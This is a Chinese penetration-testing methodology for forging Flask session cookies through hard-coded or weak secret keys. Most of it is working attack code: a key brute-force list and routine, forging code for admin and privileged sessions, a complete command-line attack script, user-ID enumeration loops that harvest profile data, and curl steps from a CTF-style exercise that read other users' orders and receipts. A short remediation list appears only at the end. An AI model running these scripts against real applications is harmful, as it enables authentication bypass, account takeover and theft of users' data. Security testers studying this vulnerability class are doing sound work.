# Flask 会话伪造攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Flask 会话伪造攻击检测与利用流程，帮助发现和利用因硬编码会话密钥导致的会话令牌伪造漏洞。

## 1.2 适用范围

本文档适用于使用 Flask 框架的 Web 应用，特别是：
- 使用 Flask 默认会话机制（客户端签名 Cookie）的应用
- 使用 itsdangerous 库进行会话签名的应用
- 存在硬编码会话密钥的 Flask 应用

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

Flask 会话伪造攻击是指攻击者通过已知的硬编码会话密钥，伪造合法的会话 Cookie，从而绕过认证机制获得未授权访问。

**本质问题**：
- Flask 应用使用硬编码的 `app.secret_key`
- 会话 Cookie 仅使用 HMAC 签名，无加密
- 密钥暴露在源代码中（可能提交到版本控制系统）
- 使用弱密钥或默认密钥

### 技术细节

**Flask 会话 Cookie 格式**：
```
session=<base64_payload>.<timestamp>.<signature>
```

- **Payload**: 使用 itsdangerous 库序列化的会话数据
- **Timestamp**: 签名时间戳
- **Signature**: 使用 secret_key 进行 HMAC 签名

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-259 | 使用硬编码密码 |
| CWE-347 | 签名验证不当 |
| CWE-287 | 身份验证不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| Flask Web 应用 | 用户登录会话 | 硬编码 `app.secret_key` |
| API 服务 | JWT 令牌签名 | 弱密钥或默认密钥 |
| 微服务 | 服务间认证令牌 | 共享密钥泄露 |
| 测试/开发环境 | 默认配置未修改 | 使用示例密钥 |

## 2.3 漏洞发现方法

### 2.3.1 源代码审计

**Flask 应用密钥检测**：

```bash
# 搜索硬编码密钥
grep -rn "secret_key" --include="*.py" .
grep -rn "SECRET_KEY" --include="*.py" .
grep -rn "your_secret" --include="*.py" .
grep -rn "app.config\['SECRET_KEY'\]" --include="*.py" .
```

**常见硬编码模式**：

```python
# 危险模式 1：简单字符串
app.secret_key = 'your_secret_key'
app.secret_key = 'secret'
app.secret_key = 'changeme'
app.secret_key = 'dev'

# 危险模式 2：可预测值
app.secret_key = 'flask_session_key'
app.secret_key = __file__

# 危险模式 3：配置文件中
# config.py
SECRET_KEY = 'hardcoded-secret-key'
```

### 2.3.2 会话令牌分析

```bash
# 获取会话 Cookie
curl -v http://target.com/

# Flask 会话 Cookie 特征：
# Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJLkw.G_vN7rMPblvzl3mCx7N0HlrDNCQ
# 格式：<payload>.<timestamp>.<signature>
```

**使用其 danger 库解码会话**：

```python
from itsdangerous import URLSafeTimedSerializer
import base64
import json

# 解码 Flask 会话 Cookie（无需密钥）
def decode_flask_session(session_cookie):
    try:
        # 分离各部分
        parts = session_cookie.split('.')
        if len(parts) != 3:
            return None
        
        # 解码 payload（base64）
        payload = parts[0]
        # 添加 padding
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding
        
        decoded = base64.urlsafe_b64decode(payload)
        return decoded
    except Exception as e:
        return None
```

### 2.3.3 密钥爆破测试

```python
from itsdangerous import URLSafeTimedSerializer

# 常见默认密钥列表
common_keys = [
    'your_secret_key', 'secret', 'flask_secret',
    'changeme', 'dev', 'test', 'password',
    'admin', 'default', 'secret_key',
    'flask', 'supersecret', 'mysecretkey'
]

def bruteforce_secret_key(session_cookie):
    for key in common_keys:
        try:
            serializer = URLSafeTimedSerializer(secret_key=key)
            # 尝试解码现有会话
            data = serializer.loads(session_cookie)
            print(f"[+] Found valid key: {key}")
            print(f"[+] Session data: {data}")
            return key
        except:
            continue
    return None
```

## 2.4 漏洞利用方法

### 2.4.1 Flask 会话伪造

**前提条件**：
- 已知 Flask 应用的硬编码密钥
- Python 环境安装 itsdangerous 库

**利用步骤**：

```python
from itsdangerous import URLSafeTimedSerializer

# 1. 获取硬编码密钥（从源代码或爆破）
secret_key = 'your_secret_key'

# 2. 初始化序列化器（使用 Flask 默认 salt）
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session'  # Flask 默认会话 salt
)

# 3. 伪造目标用户的会话
# 假设目标用户 ID 为 10032
forged_session = serializer.dumps({'user_id': 10032})

print(f"[+] Forged session cookie: {forged_session}")
```

**访问受保护资源**：

```bash
# 使用伪造的会话 Cookie
curl -s http://target.com/dashboard \
  -b "session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJNNA.F-0ZUl1ZkLkTa8QSOUKmg6RjpJM" \
  | grep "Welcome"
```

### 2.4.2 任意用户 Impersonation

```python
from itsdangerous import URLSafeTimedSerializer

secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(secret_key=secret_key, salt='cookie-session')

# 伪造管理员会话（假设 admin 用户 ID 为 1）
admin_session = serializer.dumps({
    'user_id': 1,
    'is_admin': True
})

# 伪造特定用户会话
target_user_session = serializer.dumps({
    'user_id': 10032,  # 目标用户 ID
})

# 遍历所有用户 ID
for user_id in range(1, 1000):
    session = serializer.dumps({'user_id': user_id})
    response = requests.get(
        'http://target.com/api/profile',
        cookies={'session': session}
    )
    if response.status_code == 200:
        print(f"[+] Valid user ID: {user_id}")
```

### 2.4.3 会话权限提升

```python
from itsdangerous import URLSafeTimedSerializer

secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(secret_key=secret_key, salt='cookie-session')

# 在会话中添加额外权限字段
privileged_session = serializer.dumps({
    'user_id': 10032,
    'permissions': ['read', 'write', 'delete', 'admin'],
    'role': 'superuser',
    'is_authenticated': True,
    'is_admin': True
})
```

### 2.4.4 完整攻击脚本

```python
#!/usr/bin/env python3
"""
Flask Session Forgery Attack Script
用于伪造 Flask 会话 Cookie 实现认证绕过
"""

import requests
from itsdangerous import URLSafeTimedSerializer
import sys

def forge_session(secret_key, user_id, additional_data=None):
    """伪造 Flask 会话 Cookie"""
    serializer = URLSafeTimedSerializer(
        secret_key=secret_key,
        salt='cookie-session'
    )
    
    session_data = {'user_id': user_id}
    if additional_data:
        session_data.update(additional_data)
    
    return serializer.dumps(session_data)

def test_session(target_url, session_cookie):
    """测试伪造的会话是否有效"""
    response = requests.get(
        target_url,
        cookies={'session': session_cookie}
    )
    return response.status_code == 200

def main():
    if len(sys.argv) < 4:
        print("Usage: python flask_session_forgery.py <target_url> <secret_key> <user_id>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    secret_key = sys.argv[2]
    user_id = int(sys.argv[3])
    
    # 伪造会话
    forged_session = forge_session(secret_key, user_id)
    print(f"[+] Forged session: {forged_session}")
    
    # 测试会话
    if test_session(target_url, forged_session):
        print(f"[+] Session forgery successful!")
        print(f"[+] Accessing target: {target_url}")
        
        # 获取响应内容
        response = requests.get(
            target_url,
            cookies={'session': forged_session}
        )
        print(f"[+] Response length: {len(response.text)} bytes")
    else:
        print(f"[-] Session forgery failed")

if __name__ == '__main__':
    main()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 密钥变更检测

如果应用更新了密钥，尝试以下方法：

```python
# 检查是否有多个密钥（密钥轮换）
keys_to_try = [
    'your_secret_key',
    'new_secret_key',
    'flask_secret_2024',
    'development_key',
    'production_key'
]

def find_valid_key(target_url, known_user_id):
    for key in keys_to_try:
        try:
            serializer = URLSafeTimedSerializer(secret_key=key, salt='cookie-session')
            forged_session = serializer.dumps({'user_id': known_user_id})
            
            response = requests.get(
                target_url,
                cookies={'session': forged_session}
            )
            
            if response.status_code == 200:
                print(f"[+] Found valid key: {key}")
                return key
        except:
            continue
    return None
```

### 2.5.2 Salt 值变化

某些应用可能使用自定义 salt：

```python
# 尝试常见 salt 值
common_salts = [
    'cookie-session',      # Flask 默认
    'session',
    'auth',
    'user-session',
    'flask-session',
    ''  # 空 salt
]

for salt in common_salts:
    try:
        serializer = URLSafeTimedSerializer(
            secret_key=secret_key,
            salt=salt if salt else None
        )
        forged_session = serializer.dumps({'user_id': user_id})
        # 测试...
    except:
        continue
```

### 2.5.3 签名算法绕过

某些应用可能存在签名验证缺陷：

```python
# 尝试移除签名（某些应用可能不验证）
forged_cookie = forged_session.split('.')[0] + '..'

# 尝试使用空签名
empty_sig_cookie = forged_session.rsplit('.', 1)[0] + '.'

# 尝试使用旧签名（重放攻击）
# 如果应用不检查时间戳，可以使用截获的旧签名
```

## 2.6 后渗透利用

### 2.6.1 敏感数据访问

```bash
# 访问用户数据
curl -b "session=<forged_session>" http://target.com/api/users/<target_id>

# 访问订单数据
curl -b "session=<forged_session>" http://target.com/api/orders/<target_order_id>

# 访问管理功能
curl -b "session=<forged_session>" http://target.com/admin/dashboard

# 访问敏感文件
curl -b "session=<forged_session>" http://target.com/api/receipt/<order_id>
```

### 2.6.2 横向移动

```python
# 遍历所有用户 ID 获取数据
def enumerate_users(base_url, secret_key, max_id=1000):
    serializer = URLSafeTimedSerializer(secret_key=secret_key, salt='cookie-session')
    
    valid_users = []
    for user_id in range(1, max_id):
        session = serializer.dumps({'user_id': user_id})
        response = requests.get(
            f'{base_url}/api/profile',
            cookies={'session': session}
        )
        if response.status_code == 200:
            data = response.json()
            valid_users.append({
                'user_id': user_id,
                'data': data
            })
            print(f"[+] Found user {user_id}: {data.get('username', 'N/A')}")
    
    return valid_users
```

### 2.6.3 CTF Flag 获取示例

```bash
# 场景：获取订单收据中的 CTF flag
# 1. 伪造会话
python -c "
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer('your_secret_key', salt='cookie-session')
print(s.dumps({'user_id': 10032}))
"

# 2. 使用伪造会话访问订单归档端点（IDOR）
curl -b "session=<forged_session>" http://target.com/order/300198/archive

# 3. 访问归档订单列表
curl -b "session=<forged_session>" http://target.com/orders_archive

# 4. 获取收据（包含 CTF flag）
curl -b "session=<forged_session>" http://target.com/order/300198/receipt
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 目标 | Payload | 说明 |
|-----|---------|------|
| Flask 默认会话 | `{'user_id': <id>}` | 标准 Flask 会话格式 |
| 管理员权限 | `{'user_id': 1, 'is_admin': True}` | 提升为管理员 |
| 权限提升 | `{'permissions': ['admin']}` | 添加权限 |
| 空签名测试 | `payload..` | 测试签名验证 |

## 3.2 常见硬编码密钥列表

```
your_secret_key
secret
flask_secret
changeme
dev
test
password
admin
default
secret_key
flask
supersecret
mysecretkey
development
production
```

## 3.3 工具推荐

| 工具 | 用途 | 链接 |
|-----|------|------|
| itsdangerous | Flask 会话编解码 | `pip install itsdangerous` |
| Flask-Unsign | Flask Cookie 解码/伪造 | `pip install flask-unsign` |
| Burp Suite | 会话拦截和修改 | https://portswigger.net/burp |
| secretscanner | 源代码密钥扫描 | https://github.com/dxa4481/truffleHog |

## 3.4 修复建议

1. **使用强随机密钥** - 使用 `secrets.token_hex(32)` 生成密钥
2. **密钥管理** - 使用环境变量或密钥管理系统
3. **密钥轮换** - 定期更换会话密钥
4. **服务端会话存储** - 使用 Redis/数据库存储会话
5. **代码审查** - 确保密钥不提交到版本控制系统

---

**文档版本**：1.0
**最后更新**：2026-03-08
**参考来源**：XBEN-002-24 渗透测试实战
